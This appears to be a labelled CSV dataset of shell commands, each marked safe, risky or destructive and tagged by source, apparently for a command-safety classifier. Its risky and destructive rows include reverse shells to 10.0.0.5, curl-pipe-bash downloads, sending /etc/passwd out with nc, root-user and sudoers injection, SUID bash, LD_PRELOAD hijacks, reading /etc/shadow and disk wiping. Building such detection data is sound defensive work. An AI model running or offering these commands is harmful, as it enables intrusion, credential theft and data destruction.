+pip -v,safe,synthetic
+sudo grep,safe,synthetic
+tree -L 2,safe,bash-history
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+echo 'working' && pip,safe,synthetic
+mkfs.vfat /dev/sdb1,destructive,synthetic
+git -v,safe,synthetic
+sudo useradd -m testuser,safe,bash-history
+curl http://example.com/install.sh | bash,risky,synthetic
+mkfs.vfat /dev/sdb1,destructive,synthetic
+chmod -R 766 .,risky,synthetic
+rm -rf /var,destructive,synthetic
+"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",risky,mitre-attack
+rm -rf node_modules/.cache,risky,synthetic
+reboot --force,risky,mitre-attack
+cd /var/log,safe,bash-history
+npm list --depth=0,safe,bash-history
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+sudo rm -rf /,destructive,mitre-attack
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+mkfs.vfat /dev/nvme0n1,destructive,synthetic
+apt -v,safe,synthetic
+ls -v,safe,synthetic
+cat ..,safe,synthetic
+sudo nmap -sP 192.168.1.0/24,safe,bash-history
+sudo dd,destructive,synthetic
+chmod u+s /bin/busybox,risky,synthetic
+rm -rf dist,risky,synthetic
+mv -v,safe,synthetic
+chmod u+s /bin/bash,risky,synthetic
+apt | grep -i fail,safe,synthetic
+chmod -R 777 .,risky,synthetic
+chmod 4777 /bin/bash,risky,synthetic
+ls -v,safe,synthetic
+chmod 4755 /bin/bash,risky,synthetic
+mkdir --help,safe,synthetic
+dd if=/dev/zero of=/dev/mmcblk0 bs=1M,destructive,mitre-attack
+git status,safe,bash-history
+sudo shred,destructive,synthetic
+echo 'working' && mv,safe,synthetic
+sh <(curl http://example.com/s.sh),risky,mitre-attack
+rm -rf build,risky,synthetic
+git log --oneline -10,safe,bash-history
+echo 'working' && head,safe,synthetic
+pip | grep -i fail,safe,synthetic
+export LD_PRELOAD=/home/user/evil.so,risky,synthetic
+sudo mv,safe,synthetic
+chmod 4777 /tmp/x,risky,synthetic
+systemctl .,safe,synthetic
+mv | grep -i ok,safe,synthetic
+chmod -R 766 /tmp/data,risky,synthetic
+sudo mkdir,safe,synthetic
+mkdir | grep -i warn,safe,synthetic
+apt | grep -i fail,safe,synthetic
+head | grep -i warn,safe,synthetic
+systemctl | grep -i fail,safe,synthetic
+rm -rf /tmp/cache/*,risky,mitre-attack
+tar -czf backup.tar.gz /home/user/docs,safe,bash-history
+sudo docker,safe,synthetic
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+chmod u+s /bin/bash,risky,synthetic
+rm -rf /var,destructive,synthetic
+cd ..,safe,bash-history
+sudo cat,safe,synthetic
+mv | grep -i ok,safe,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive,synthetic
+rm -rf /bin,destructive,synthetic
+chmod 777 /etc/passwd,destructive,mitre-attack
+shred -vfz /dev/sdb,destructive,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+head --help,safe,synthetic
+sudo mkfs,destructive,synthetic
+echo 'working' && cp,safe,synthetic
+cat ..,safe,synthetic
+grep | grep -i fail,safe,synthetic
+chmod -R 777 /tmp/data,risky,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+sudo cat,safe,synthetic
+git | grep -i fail,safe,synthetic
+rm -rf /bin,destructive,mitre-attack
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+chmod -R 777 /var/www,risky,synthetic
+chmod -R 777 .,risky,synthetic
+mv -v,safe,synthetic
+echo 'working' && mv,safe,synthetic
+lspci,safe,bash-history
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
+grep /var/log,safe,synthetic
+echo 'working' && apt,safe,synthetic
+chmod u+s /bin/busybox,risky,synthetic
+pip install requests,safe,bash-history
+cat --help,safe,synthetic
+sudo cat,safe,synthetic
+sudo systemctl,safe,synthetic
+dd if=/dev/urandom of=/dev/sdb bs=1M,destructive,synthetic
+docker /var/log,safe,synthetic
+cat | grep -i ok,safe,synthetic
+echo 'working' && cat,safe,synthetic
+rm -rf build,risky,synthetic
+docker logs app,safe,bash-history
+echo 'working' && ls,safe,synthetic
+rm -rf dist,risky,synthetic
+sudo mkdir,safe,synthetic
+chmod 644 config.json,safe,bash-history
+cp --help,safe,synthetic
+chmod +x deploy.sh,safe,bash-history
+git diff,safe,bash-history
+chmod -R 777 /var/www,risky,synthetic
+ssh user@server 'df -h',safe,bash-history
+git --help,safe,synthetic
+curl http://example.com/install.sh | bash,risky,mitre-attack
+rm -rf /usr,destructive,synthetic
+chmod 4755 /bin/bash,risky,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+head --help,safe,synthetic
+grep src/,safe,synthetic
+chown -R user:user /home/user/project,safe,bash-history
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+sudo docker,safe,synthetic
+chmod 4755 /bin/busybox,risky,synthetic
+systemctl .,safe,synthetic
+ls --help,safe,synthetic
+rm -rf /root,destructive,mitre-attack
+rm -rf build,risky,synthetic
+sudo shred,destructive,synthetic
+socat TCP:10.0.0.5:9999 EXEC:/bin/sh,risky,mitre-attack
+systemctl -v,safe,synthetic
+mv | grep -i ok,safe,synthetic
+chmod -R 766 /var/www,risky,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+chmod -R 777 /tmp/data,risky,synthetic
+head --help,safe,synthetic
+echo 'working' && pip,safe,synthetic
+cp -v,safe,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+cp data/,safe,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+shred -vfz /dev/sdb,destructive,synthetic
+rm -rf /bin,destructive,synthetic
+systemctl -v,safe,synthetic
+echo 'working' && mkdir,safe,synthetic
+sudo rm,destructive,synthetic
+ls | grep -i ok,safe,synthetic
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
+rm -rf build,risky,synthetic
+journalctl -f,safe,bash-history
+rm -rf dist,risky,synthetic
+echo 'working' && docker,safe,synthetic
+shred -u /dev/sdb,destructive,synthetic
+cargo run,safe,bash-history
+chmod 4755 /tmp/x,risky,synthetic
+chmod -R 777 /var/www,risky,synthetic
+cat -v,safe,synthetic
+sudo mkfs,destructive,synthetic
+chmod -R 777 /var/www,risky,synthetic
+head --help,safe,synthetic
+sudo git,safe,synthetic
+mkfs.ext4 /dev/sda,destructive,synthetic
+chmod -R 777 .,risky,synthetic
+sudo mkfs,destructive,synthetic
+cp | grep -i ok,safe,synthetic
+apt --help,safe,synthetic
+mv ..,safe,synthetic
+grep -v,safe,synthetic
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+exit,safe,bash-history
+echo 'working' && git,safe,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+cp -v,safe,synthetic
+grep --help,safe,synthetic
+shred -u /dev/mmcblk0,destructive,synthetic
+echo 'working' && grep,safe,synthetic
+mkdir -v,safe,synthetic
+sudo cp,safe,synthetic
+grep --help,safe,synthetic
+git --help,safe,synthetic
+systemctl stop bluetooth,safe,bash-history
+nslookup google.com,safe,bash-history
+apt -v,safe,synthetic
+cat --help,safe,synthetic
+sed -i 's/old/new/g' file.txt,safe,bash-history
+python --version,safe,bash-history
+rm -rf /dev/sda,destructive,mitre-attack
+rm -rf node_modules/.cache,risky,synthetic
+grep -r error /var/log,safe,bash-history
+pip build/,safe,synthetic
+echo 'working' && mkdir,safe,synthetic
+mkfs -t ext4 /dev/sdb,destructive,mitre-attack
+sudo head,safe,synthetic
+more notes.txt,safe,bash-history
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+man rsync,safe,bash-history
+grep | grep -i ok,safe,synthetic
+ip route,safe,bash-history
+sudo sysctl -w kernel.randomize_va_space=0,risky,mitre-attack
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+chmod -R 777 .,risky,synthetic
+watch -n 2 'df -h',safe,bash-history
+rm -f package-lock.json,risky,mitre-attack
+ls /tmp,safe,synthetic
+shred -n 3 /dev/sdb,destructive,synthetic
+echo 'working' && apt,safe,synthetic
+chmod 777 /tmp/data,risky,mitre-attack
+docker /tmp,safe,synthetic
+rm -rf .,destructive,mitre-attack
+mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 5555 > /tmp/f,risky,mitre-attack
+echo 'working' && mkdir,safe,synthetic
+docker run --privileged -it ubuntu bash,risky,mitre-attack
+echo 'working' && ls,safe,synthetic
+tar -xzf archive.tar.gz -C /tmp,safe,bash-history
+init 0,risky,mitre-attack
+echo 'working' && cat,safe,synthetic
+awk '{print $1}' access.log,safe,bash-history
+blkdiscard /dev/sda,destructive,mitre-attack
+git ~/documents,safe,synthetic
+pip list,safe,bash-history
+mkdir /tmp/test,safe,bash-history
+dd if=/dev/urandom of=/dev/nvme0n1 bs=512,destructive,synthetic
+chmod 4755 /bin/busybox,risky,synthetic
+shred -u /dev/mmcblk0,destructive,synthetic
+bash -i >& /dev/tcp/10.0.0.5/4444 0>&1,risky,mitre-attack
+grep | grep -i ok,safe,synthetic
+git rebase main,safe,bash-history
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+systemctl list-units,safe,bash-history
+export LD_PRELOAD=/tmp/lib.so,risky,synthetic
+ls /tmp,safe,synthetic
+sudo docker,safe,synthetic
+docker system df,safe,bash-history
+chmod 4777 /bin/busybox,risky,synthetic
+cp | grep -i error,safe,synthetic
+git -v,safe,synthetic
+sudo mv,safe,synthetic
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
+sudo cp,safe,synthetic
+mkfs.ext4 /dev/sda,destructive,mitre-attack
+mkdir --help,safe,synthetic
+mkdir --help,safe,synthetic
+rm -rf /,destructive,mitre-attack
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+chmod 4755 /bin/busybox,risky,synthetic
+df -h,safe,bash-history
+cat ..,safe,synthetic
+sudo systemctl,safe,synthetic
+echo 'working' && git,safe,synthetic
+cat -v,safe,synthetic
+locate nginx.conf,safe,bash-history
+mkdir | grep -i error,safe,synthetic
+ls --help,safe,synthetic
+curl -s http://pwn.example.com/x | sh,risky,mitre-attack
+rm -rf dist,risky,synthetic
+chmod -R 766 /var/www,risky,synthetic
+dd if=/dev/urandom of=/dev/mmcblk0 bs=1M,destructive,synthetic
+cat --help,safe,synthetic
+docker -v,safe,synthetic
+rm -rf /tmp/test/*,risky,synthetic
+chmod -R 766 .,risky,synthetic
+apt | grep -i warn,safe,synthetic
+sudo mv,safe,synthetic
+grep --help,safe,synthetic
+sudo apt,safe,synthetic
+vim -c ':!/bin/sh',risky,gtfobins
+docker -v,safe,synthetic
+mkfs.xfs /dev/nvme0n1,destructive,synthetic
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+sleep 5 && echo done,safe,bash-history
+cat -v,safe,synthetic
+sudo wipefs,destructive,synthetic
+ps aux | grep python,safe,bash-history
+curl -I https://example.com,safe,bash-history
+rm -rf build/,risky,mitre-attack
+echo $HOME,safe,bash-history
+sudo systemctl,safe,synthetic
+mv | grep -i ok,safe,synthetic
+chmod 4777 /tmp/x,risky,synthetic
+rm -rf node_modules/.cache,risky,synthetic
+pip --help,safe,synthetic
+cat | grep -i fail,safe,synthetic
+sudo systemctl start postgresql,safe,bash-history
+mv | grep -i fail,safe,synthetic
+rm -rf /*,destructive,mitre-attack
+chmod u+s /tmp/x,risky,synthetic
+docker src/,safe,synthetic
+echo 'working' && cat,safe,synthetic
+chmod 4777 /bin/bash,risky,synthetic
+history,safe,bash-history
+docker --help,safe,synthetic
+rm -rf ./*,destructive,mitre-attack
+pip | grep -i error,safe,synthetic
+netstat -tulpn,safe,bash-history
+sudo mv,safe,synthetic
+chmod u+s /bin/busybox,risky,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+chmod u+s /bin/busybox,risky,synthetic
+echo 'working' && mkdir,safe,synthetic
+mkfs.btrfs /dev/nvme0n1,destructive,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+chmod -R 777 .,risky,synthetic
+pip | grep -i error,safe,synthetic
+sudo mv,safe,synthetic
+sudo shred,destructive,synthetic
+du -sh * | sort -rh | head -10,safe,bash-history
+docker -v,safe,synthetic
+shutdown -h now &,destructive,mitre-attack
+less README.md,safe,bash-history
+sudo pip,safe,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+echo 'working' && ls,safe,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+sudo docker,safe,synthetic
+pip | grep -i ok,safe,synthetic
+rm -rf __pycache__,risky,synthetic
+pip | grep -i error,safe,synthetic
+rm -rf /lib,destructive,mitre-attack
+dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive,synthetic
+rm -rf ./node_modules,risky,mitre-attack
+gcc -o hello hello.c,safe,bash-history
+docker --help,safe,synthetic
+traceroute 8.8.8.8,safe,bash-history
+chmod 4755 /bin/bash,risky,synthetic
+systemctl src/,safe,synthetic
+chmod -R 777 /opt/app,risky,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+systemctl --help,safe,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+rm -rf /proc,destructive,mitre-attack
+crontab -r,risky,mitre-attack
+mkfs.vfat /dev/sda,destructive,synthetic
+dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive,synthetic
+cp -v,safe,synthetic
+rm -rf /boot,destructive,synthetic
+sudo cp,safe,synthetic
+docker -v,safe,synthetic
+chmod -R 766 /var/www,risky,synthetic
+time python script.py,safe,bash-history
+rm -rf /bin,destructive,synthetic
+rm -rf /etc,destructive,synthetic
+ls --help,safe,synthetic
+chmod -R 777 .,risky,synthetic
+docker src/,safe,synthetic
+export LD_PRELOAD=/home/user/evil.so,risky,synthetic
+git fetch origin,safe,bash-history
+yes | head -10,safe,bash-history
+rm -rf tmp/*,risky,synthetic
+sudo cp,safe,synthetic
+echo 'working' && mv,safe,synthetic
+du -sh /home/user,safe,bash-history
+mv --help,safe,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+sudo mkfs,destructive,synthetic
+env,safe,bash-history
+cp | grep -i error,safe,synthetic
+ls | grep -i fail,safe,synthetic
+find . -name '*.py',safe,bash-history
+ls | grep -i warn,safe,synthetic
+sudo rm,destructive,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+docker | grep -i fail,safe,synthetic
+shred -n 3 /dev/mmcblk0,destructive,synthetic
+dd if=/dev/zero of=/dev/nvme0n1 bs=1M,destructive,synthetic
+rm -rf build,risky,synthetic
+chmod -R 766 .,risky,synthetic
+docker | grep -i warn,safe,synthetic
+chmod 4755 /bin/bash,risky,synthetic
+echo 'working' && systemctl,safe,synthetic
+nc 10.0.0.5 5555 < /etc/passwd,risky,mitre-attack
+dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive,synthetic
+rm -fr /,destructive,mitre-attack
+sudo cat,safe,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+echo 'working' && docker,safe,synthetic
+find / -exec rm -rf {} +,destructive,mitre-attack
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+chmod -R 777 /tmp/data,risky,synthetic
+head .,safe,synthetic
+export LD_PRELOAD=/home/user/evil.so,risky,synthetic
+rm -rf /,destructive,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+head -v,safe,synthetic
+chmod -R 766 /var/www,risky,synthetic
+echo 'working' && pip,safe,synthetic
+dd if=/dev/zero of=/dev/sda bs=4M,destructive,synthetic
+sudo apt install htop,safe,bash-history
+chmod -R 777 .,risky,synthetic
+chmod -R 766 .,risky,synthetic
+git | grep -i fail,safe,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+rm -rf /var,destructive,synthetic
+echo hello world,safe,bash-history
+ls /var/log,safe,synthetic
+sudo docker,safe,synthetic
+mkdir | grep -i error,safe,synthetic
+dd if=/dev/urandom of=/dev/sda bs=4M,destructive,synthetic
+cp -r assets dist/,safe,bash-history
+export LD_PRELOAD=/home/user/evil.so,risky,synthetic
+rm -rf tmp/*,risky,synthetic
+cp src/,safe,synthetic
+sudo rm,destructive,synthetic
+rm -rf /*,destructive,synthetic
+echo 'working' && cp,safe,synthetic
+dd if=/dev/zero of=/dev/mmcblk0 bs=4M,destructive,synthetic
+mkfs.xfs /dev/nvme0n1,destructive,mitre-attack
+ss -tulpn,safe,bash-history
+systemctl --help,safe,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+sudo apt,safe,synthetic
+pkill -9 -u root,risky,mitre-attack
+mkdir data/,safe,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+apt --help,safe,synthetic
+dd if=/dev/sda of=/dev/null bs=1M count=1,destructive,mitre-attack
+dd if=/dev/urandom of=/dev/mmcblk0 bs=4M,destructive,synthetic
+cat --help,safe,synthetic
+head | grep -i ok,safe,synthetic
+mkfs.xfs /dev/sda,destructive,synthetic
+echo 'working' && mkdir,safe,synthetic
+sudo ls,safe,synthetic
+mkfs.vfat /dev/sda,destructive,synthetic
+mv --help,safe,synthetic
+sudo wipefs,destructive,synthetic
+echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,risky,mitre-attack
+mkfs.ext4 /dev/sda,destructive,synthetic
+dd if=/dev/zero of=/dev/sdb bs=4M,destructive,synthetic
+head /tmp,safe,synthetic
+export LD_PRELOAD=/tmp/lib.so,risky,synthetic
+pip --help,safe,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+export LD_PRELOAD=/tmp/lib.so,risky,synthetic
+printf 'name: %s\n' adhi,safe,bash-history
+shred -u /dev/sda,destructive,synthetic
+sudo rm -rf /lib/modules,destructive,mitre-attack
+apt --help,safe,synthetic
+sudo rm -rf /sbin,destructive,mitre-attack
+head | grep -i ok,safe,synthetic
+pip --help,safe,synthetic
+shred -n 3 /dev/sdb,destructive,synthetic
+rm -rf dist/*,risky,mitre-attack
+mkfs.btrfs /dev/sda,destructive,synthetic
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
+head -v,safe,synthetic
+dd if=/dev/zero of=/dev/sdb1,destructive,mitre-attack
+git | grep -i error,safe,synthetic
+echo 'working' && systemctl,safe,synthetic
+sudo grep,safe,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+echo 'working' && docker,safe,synthetic
+npm start,safe,bash-history
+echo 0 > /proc/sys/kernel/randomize_va_space,risky,mitre-attack
+iptables -P INPUT ACCEPT,risky,mitre-attack
+"eval ""$PAYLOAD""",risky,mitre-attack
+curl http://example.com/install.sh | bash,risky,synthetic
+docker | grep -i error,safe,synthetic
+dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive,synthetic
+sudo systemctl,safe,synthetic
+pip -v,safe,synthetic
+shred -vfz /dev/sda,destructive,mitre-attack
+rm -rf __pycache__,risky,mitre-attack
+cp --help,safe,synthetic
+sudo mkdir,safe,synthetic
+sudo head,safe,synthetic
+cp ~/documents,safe,synthetic
+npm run build,safe,bash-history
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+pip src/,safe,synthetic
+curl -s https://api.example.com/status,safe,bash-history
+date,safe,bash-history
+export LD_PRELOAD=/home/user/evil.so,risky,synthetic
+mv src/,safe,synthetic
+systemctl | grep -i warn,safe,synthetic
+systemctl stop firewalld,risky,mitre-attack
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+sudo shred,destructive,synthetic
+sudo su,risky,mitre-attack
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+eval $(cat /tmp/script.txt),risky,mitre-attack
+apt --help,safe,synthetic
+echo 'working' && cp,safe,synthetic
+docker --help,safe,synthetic
+find / -name 'x' -exec /bin/sh \;,risky,gtfobins
+zip -r backup.zip data/,safe,bash-history
+rm -rf /*,destructive,synthetic
+cat | grep -i fail,safe,synthetic
+chmod -R 766 .,risky,synthetic
+mkdir | grep -i warn,safe,synthetic
+cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash,risky,mitre-attack
+curl http://example.com/install.sh | bash,risky,synthetic
+docker | grep -i warn,safe,synthetic
+apt -v,safe,synthetic
+chmod 4777 /tmp/x,risky,synthetic
+chmod -R 777 .,risky,mitre-attack
+grep ..,safe,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+head data/,safe,synthetic
+uptime,safe,bash-history
+mkfs.btrfs /dev/sda,destructive,synthetic
+kill -9 1,risky,mitre-attack
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+killall -9 java,risky,mitre-attack
+grep | grep -i error,safe,synthetic
+rm -rf /etc,destructive,synthetic
+sudo rm -rf /etc/ssh,destructive,mitre-attack
+shred -vfz /dev/sda,destructive,synthetic
+shred -n 3 /dev/sda,destructive,synthetic
+mkdir src/,safe,synthetic
+chmod -R 777 /var/www,risky,synthetic
+chmod -R 766 /opt/app,risky,synthetic
+chmod 4755 /tmp/x,risky,synthetic
+head | grep -i fail,safe,synthetic
+git commit -m 'fix: bug',safe,bash-history
+curl http://example.com/install.sh | bash,risky,synthetic
+docker --help,safe,synthetic
+chmod -R 777 /var/www,risky,synthetic
+systemctl --help,safe,synthetic
+sudo mkdir,safe,synthetic
+cp | grep -i error,safe,synthetic
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
+chmod -R 777 /opt/app,risky,synthetic
+grep | grep -i warn,safe,synthetic
+systemctl | grep -i warn,safe,synthetic
+chmod u+s /tmp/x,risky,synthetic
+export LD_PRELOAD=/home/user/evil.so,risky,synthetic
+mv ~/documents,safe,synthetic
+rm -rf /*,destructive,synthetic
+echo 'working' && apt,safe,synthetic
+echo 'working' && head,safe,synthetic
+cd ~,safe,bash-history
+pip -v,safe,synthetic
+sudo dd,destructive,synthetic
+docker | grep -i error,safe,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+systemctl -v,safe,synthetic
+"perl -e 'exec ""/bin/sh"";'",risky,gtfobins
+ls ..,safe,synthetic
+sudo dd,destructive,synthetic
+sudo grep,safe,synthetic
+chmod -R 766 /opt/app,risky,synthetic
+head /tmp,safe,synthetic
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+ls -v,safe,synthetic
+chmod 4777 /tmp/x,risky,synthetic
+chmod u+s /tmp/x,risky,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+git -v,safe,synthetic
+sudo mkfs,destructive,synthetic
+echo 'working' && mkdir,safe,synthetic
+shred -vfz /dev/mmcblk0,destructive,synthetic
+grep build/,safe,synthetic
+sudo rm -fr /home,destructive,mitre-attack
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
+rm -rf /var,destructive,mitre-attack
+grep --help,safe,synthetic
+cat /etc/shadow,risky,mitre-attack
+curl http://example.com/install.sh | bash,risky,synthetic
+whoami,safe,bash-history
+echo 'working' && systemctl,safe,synthetic
+apt /tmp,safe,synthetic
+systemctl --help,safe,synthetic
+docker images,safe,bash-history
+wipefs -af /dev/nvme0n1,destructive,mitre-attack
+chmod u+s /bin/bash,risky,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+echo 'working' && cp,safe,synthetic
+yes > /dev/null &,destructive,mitre-attack
+pip -v,safe,synthetic
+sudo git,safe,synthetic
+blkid,safe,bash-history
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
+rm -rf /var,destructive,synthetic
+rm -rf dist,risky,synthetic
+dd if=/dev/zero of=/dev/sda bs=1M,destructive,synthetic
+sudo mkdir,safe,synthetic
+ip addr,safe,bash-history
+curl http://example.com/install.sh | bash,risky,synthetic
+export LD_PRELOAD=/tmp/lib.so,risky,synthetic
+mkfs.vfat /dev/nvme0n1,destructive,synthetic
+ls -l /home/user,safe,bash-history
+sudo wipefs,destructive,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+rm -rf *,destructive,mitre-attack
+cp | grep -i fail,safe,synthetic
+cp -v,safe,synthetic
+ls | grep -i fail,safe,synthetic
+export LD_PRELOAD=/tmp/lib.so,risky,mitre-attack
+export LD_PRELOAD=/tmp/lib.so,risky,synthetic
+make -j4,safe,bash-history
+shred -u /dev/sdb,destructive,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+echo 'working' && cp,safe,synthetic
+rm -rf /bin,destructive,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+grep | grep -i warn,safe,synthetic
+pip data/,safe,synthetic
+docker exec -it container /bin/sh,risky,mitre-attack
+cp | grep -i fail,safe,synthetic
+apt | grep -i error,safe,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
